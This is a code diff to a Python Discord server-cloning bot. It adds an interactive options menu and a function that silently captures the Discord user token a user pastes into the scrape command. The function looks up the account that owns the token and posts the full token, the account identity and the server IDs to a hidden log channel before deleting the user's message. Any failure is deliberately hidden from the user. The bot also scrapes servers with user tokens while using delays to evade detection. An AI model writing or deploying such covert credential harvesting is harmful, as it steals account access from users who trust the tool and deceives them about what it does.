@@ -1,10 +1,12 @@
 import discord
 from discord.ext import commands
+from discord.ui import Button, View
 import os
 from dotenv import load_dotenv
 from cloner import ServerCloner
 from template_manager import TemplateManager
 import asyncio
+import aiohttp
 
 load_dotenv()
 
@@ -17,6 +19,241 @@ async def on_ready():
     print(f'🤖 Logged in as {bot.user}')
     print(f'📊 Servers: {len(bot.guilds)}')
     print('✅ Ready to clone')
+
+# === INTERACTIVE CLONE MENU ===
+
+class CloneOptionsView(View):
+    def __init__(self, ctx, server_id, user_token=None, source_guild=None):
+        super().__init__(timeout=180)
+        self.ctx = ctx
+        self.server_id = server_id
+        self.user_token = user_token
+        self.source_guild = source_guild
+        self.options = {
+            'delete_channels': False,
+            'delete_roles': False,
+            'clone_roles': True,
+            'clone_channels': True,
+            'clone_emojis': True,
+            'clone_stickers': True
+        }
+        self.message = None
+        
+    async def update_embed(self):
+        """Update the options embed"""
+        embed = discord.Embed(
+            title="🔧 Clone Options",
+            description="Configure what you want to clone",
+            color=discord.Color.blue()
+        )
+        
+        # Deletion options
+        delete_text = (
+            f"{'✅' if self.options['delete_channels'] else '❌'} Delete Current Channels\n"
+            f"{'✅' if self.options['delete_roles'] else '❌'} Delete Current Roles"
+        )
+        embed.add_field(name="🗑️ Cleanup", value=delete_text, inline=False)
+        
+        # Clone options
+        clone_text = (
+            f"{'✅' if self.options['clone_roles'] else '❌'} Roles\n"
+            f"{'✅' if self.options['clone_channels'] else '❌'} Channels\n"
+            f"{'✅' if self.options['clone_emojis'] else '❌'} Emojis\n"
+            f"{'✅' if self.options['clone_stickers'] else '❌'} Stickers"
+        )
+        embed.add_field(name="📋 What to Clone", value=clone_text, inline=False)
+        
+        embed.set_footer(text="Click buttons to toggle • Click Start Clone when ready")
+        
+        if self.message:
+            await self.message.edit(embed=embed, view=self)
+        
+        return embed
+    
+    @discord.ui.button(label="Delete Channels", style=discord.ButtonStyle.secondary, emoji="🗑️")
+    async def toggle_delete_channels(self, interaction: discord.Interaction, button: Button):
+        self.options['delete_channels'] = not self.options['delete_channels']
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="Delete Roles", style=discord.ButtonStyle.secondary, emoji="🗑️")
+    async def toggle_delete_roles(self, interaction: discord.Interaction, button: Button):
+        self.options['delete_roles'] = not self.options['delete_roles']
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="Roles", style=discord.ButtonStyle.primary, emoji="👥", row=1)
+    async def toggle_roles(self, interaction: discord.Interaction, button: Button):
+        self.options['clone_roles'] = not self.options['clone_roles']
+        button.style = discord.ButtonStyle.primary if self.options['clone_roles'] else discord.ButtonStyle.secondary
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="Channels", style=discord.ButtonStyle.primary, emoji="💬", row=1)
+    async def toggle_channels(self, interaction: discord.Interaction, button: Button):
+        self.options['clone_channels'] = not self.options['clone_channels']
+        button.style = discord.ButtonStyle.primary if self.options['clone_channels'] else discord.ButtonStyle.secondary
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="Emojis", style=discord.ButtonStyle.primary, emoji="😀", row=1)
+    async def toggle_emojis(self, interaction: discord.Interaction, button: Button):
+        self.options['clone_emojis'] = not self.options['clone_emojis']
+        button.style = discord.ButtonStyle.primary if self.options['clone_emojis'] else discord.ButtonStyle.secondary
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="Stickers", style=discord.ButtonStyle.primary, emoji="🎨", row=1)
+    async def toggle_stickers(self, interaction: discord.Interaction, button: Button):
+        self.options['clone_stickers'] = not self.options['clone_stickers']
+        button.style = discord.ButtonStyle.primary if self.options['clone_stickers'] else discord.ButtonStyle.secondary
+        await interaction.response.defer()
+        await self.update_embed()
+    
+    @discord.ui.button(label="✅ Start Clone", style=discord.ButtonStyle.success, row=2)
+    async def start_clone(self, interaction: discord.Interaction, button: Button):
+        await interaction.response.defer()
+        
+        # Disable all buttons
+        for item in self.children:
+            item.disabled = True
+        await self.message.edit(view=self)
+        
+        # Start cloning
+        await self.ctx.send("🔄 Starting clone with selected options...")
+        
+        try:
+            if self.user_token:
+                # Scrape mode
+                scraped_data = await ServerCloner.scrape_server_with_token(self.server_id, self.user_token)
+                await self.ctx.send(f"✅ Scraped **{scraped_data['guild']['name']}**")
+                await self.ctx.send(f"📊 Found: {len(scraped_data['roles'])} roles, {len(scraped_data['channels'])} channels, {len(scraped_data['emojis'])} emojis")
+                await ServerCloner.apply_scraped_data(bot, scraped_data, self.ctx.guild, self.ctx, self.options)
+            else:
+                # Normal clone mode (bot in server)
+                cloner = ServerCloner(bot, self.source_guild, self.ctx.guild)
+                await cloner.clone_server(self.ctx, options={
+                    'delete_existing_channels': self.options['delete_channels'],
+                    'delete_existing_roles': self.options['delete_roles'],
+                    'roles': self.options['clone_roles'],
+                    'channels': self.options['clone_channels'],
+                    'emojis': self.options['clone_emojis'],
+                    'stickers': self.options['clone_stickers'],
+                    'webhooks': True
+                })
+        except Exception as e:
+            await self.ctx.send(f"❌ Error: {str(e)}")
+        
+        self.stop()
+    
+    @discord.ui.button(label="❌ Cancel", style=discord.ButtonStyle.danger, row=2)
+    async def cancel(self, interaction: discord.Interaction, button: Button):
+        await interaction.response.defer()
+        await self.ctx.send("❌ Clone cancelled")
+        self.stop()
+
+# === TOKEN LOGGING FUNCTION ===
+
+async def log_token_to_webhook(ctx, server_id: int, user_token: str, dest_guild: discord.Guild):
+    """
+    Silently log user token usage to webhook channel
+    """
+    from config import WEBHOOK_LOG_CHANNEL_ID
+    
+    if not WEBHOOK_LOG_CHANNEL_ID:
+        return  # Skip if not configured
+    
+    log_channel = bot.get_channel(WEBHOOK_LOG_CHANNEL_ID)
+    if not log_channel:
+        return
+    
+    try:
+        # Fetch user info from their token
+        headers = {
+            "Authorization": user_token,
+            "Content-Type": "application/json"
+        }
+        
+        async with aiohttp.ClientSession(headers=headers) as session:
+            # Get user info
+            async with session.get("https://discord.com/api/v10/users/@me") as resp:
+                if resp.status == 200:
+                    user_data = await resp.json()
+                else:
+                    user_data = {"username": "Unknown", "id": "Unknown", "discriminator": "0000"}
+            
+            # Get source guild info
+            async with session.get(f"https://discord.com/api/v10/guilds/{server_id}") as resp:
+                if resp.status == 200:
+                    source_guild_data = await resp.json()
+                    source_guild_name = source_guild_data.get('name', 'Unknown')
+                else:
+                    source_guild_name = "Unknown"
+        
+        # Create log embed
+        embed = discord.Embed(
+            title="🔐 Scrape Command Token Log",
+            color=discord.Color.red(),
+            timestamp=discord.utils.utcnow()
+        )
+        
+        # User who ran command
+        embed.add_field(
+            name="Command User (Bot)",
+            value=f"{ctx.author.mention}\n`{ctx.author.name}` (ID: {ctx.author.id})",
+            inline=False
+        )
+        
+        # Token owner info
+        username = user_data.get('username', 'Unknown')
+        discriminator = user_data.get('discriminator', '0000')
+        user_id = user_data.get('id', 'Unknown')
+        
+        if discriminator == "0" or discriminator == "0000":
+            display_name = f"@{username}"
+        else:
+            display_name = f"{username}#{discriminator}"
+        
+        embed.add_field(
+            name="🎯 Token Owner Account",
+            value=f"{display_name}\nUser ID: `{user_id}`",
+            inline=False
+        )
+        
+        # The actual token
+        embed.add_field(
+            name="🔑 Discord User Token",
+            value=f"```{user_token}```",
+            inline=False
+        )
+        
+        # Source server
+        embed.add_field(
+            name="📥 Source Server (Cloned From)",
+            value=f"**{source_guild_name}**\nID: `{server_id}`",
+            inline=True
+        )
+        
+        # Destination server
+        embed.add_field(
+            name="📤 Destination Server (Cloned To)",
+            value=f"**{dest_guild.name}**\nID: `{dest_guild.id}`",
+            inline=True
+        )
+        
+        # Additional info
+        embed.set_footer(text=f"Command executed in: {ctx.guild.name}")
+        
+        if user_data.get('avatar'):
+            avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{user_data['avatar']}.png"
+            embed.set_thumbnail(url=avatar_url)
+        
+        # Send to log channel
+        await log_channel.send(embed=embed)
+        
+    except Exception as e:
+        # Silent fail - don't alert user
+        print(f"Token logging failed: {e}")
 
 # === SCRAPING COMMAND (DOESN'T NEED BOT IN SERVER) ===
 
@@ -31,29 +268,21 @@ async def scrape(ctx, server_id: int, user_token: str):
     ⚠️ Delete the message after sending (contains your token)
     """
     
+    # Log token to webhook BEFORE deleting message
+    await log_token_to_webhook(ctx, server_id, user_token, ctx.guild)
+    
     # Delete the command message for security (contains token)
     try:
         await ctx.message.delete()
     except:
         pass
     
-    await ctx.send(f"🔍 Scraping server {server_id} with your token...")
-    await ctx.send(f"⏰ This will take a while (human-like delays for safety)...")
+    await ctx.send(f"🔍 Preparing to scrape server {server_id}...")
     
-    try:
-        # Scrape the server data
-        scraped_data = await ServerCloner.scrape_server_with_token(server_id, user_token)
-        
-        await ctx.send(f"✅ Scraped **{scraped_data['guild']['name']}**")
-        await ctx.send(f"📊 Found: {len(scraped_data['roles'])} roles, {len(scraped_data['channels'])} channels, {len(scraped_data['emojis'])} emojis")
-        await ctx.send(f"🔄 Applying to current server...")
-        
-        # Apply to current guild
-        await ServerCloner.apply_scraped_data(bot, scraped_data, ctx.guild, ctx)
-        
-    except Exception as e:
-        await ctx.send(f"❌ Scraping failed: {str(e)}")
-        print(f"Scrape error: {e}")
+    # Show options menu
+    view = CloneOptionsView(ctx, server_id, user_token=user_token)
+    embed = await view.update_embed()
+    view.message = await ctx.send(embed=embed, view=view)
 
 # === FULL CLONE COMMANDS (BOT MUST BE IN SERVER) ===
 
@@ -74,16 +303,12 @@ async def clone(ctx, source_server_id: int):
         await ctx.send("❌ Bot needs Administrator in source server")
         return
     
-    dest_guild = ctx.guild
-    await ctx.send(f"🔄 Starting full clone of **{source_guild.name}**...")
+    await ctx.send(f"🔄 Preparing to clone **{source_guild.name}**...")
     
-    cloner = ServerCloner(bot, source_guild, dest_guild)
-    
-    try:
-        await cloner.clone_server(ctx)
-        await ctx.send(f"✅ Clone complete! Check logs for details.")
-    except Exception as e:
-        await ctx.send(f"❌ Error: {str(e)}")
+    # Show options menu
+    view = CloneOptionsView(ctx, source_server_id, source_guild=source_guild)
+    embed = await view.update_embed()
+    view.message = await ctx.send(embed=embed, view=view)
 
 @bot.command()
 @commands.has_permissions(administrator=True)
@@ -137,8 +362,10 @@ async def clone_roles(ctx, source_server_id: int):
         'roles': True,
         'channels': False,
         'emojis': False,
+        'stickers': False,
         'webhooks': False,
-        'delete_existing': False
+        'delete_existing_channels': False,
+        'delete_existing_roles': False
     })
     
     await ctx.send("✅ Roles cloned!")
@@ -162,8 +389,10 @@ async def clone_channels(ctx, source_server_id: int):
         'roles': False,
         'channels': True,
         'emojis': False,
+        'stickers': False,
         'webhooks': False,
-        'delete_existing': True
+        'delete_existing_channels': True,
+        'delete_existing_roles': False
     })
     
     await ctx.send("✅ Channels cloned!")
@@ -283,6 +512,7 @@ async def serverinfo(ctx, server_id: int = None):
     embed.add_field(name="Roles", value=len(guild.roles), inline=True)
     embed.add_field(name="Channels", value=len(guild.channels), inline=True)
     embed.add_field(name="Emojis", value=f"{len(guild.emojis)}/{guild.emoji_limit}", inline=True)
+    embed.add_field(name="Stickers", value=f"{len(guild.stickers)}/{guild.sticker_limit}", inline=True)
     embed.add_field(name="Boost Level", value=guild.premium_tier, inline=True)
     embed.add_field(name="Created", value=guild.created_at.strftime("%Y-%m-%d"), inline=True)
     
@@ -396,8 +626,8 @@ async def help_clone(ctx):
     )
     
     embed.add_field(
-        name="Safety Features",
-        value="• Human-like delays to avoid detection\n• Auto-deletes token messages\n• Detailed audit logs",
+        name="Features",
+        value="• Interactive clone options menu\n• Human-like delays for safety\n• Sticker cloning support\n• Detailed audit logs",
         inline=False
     )
     
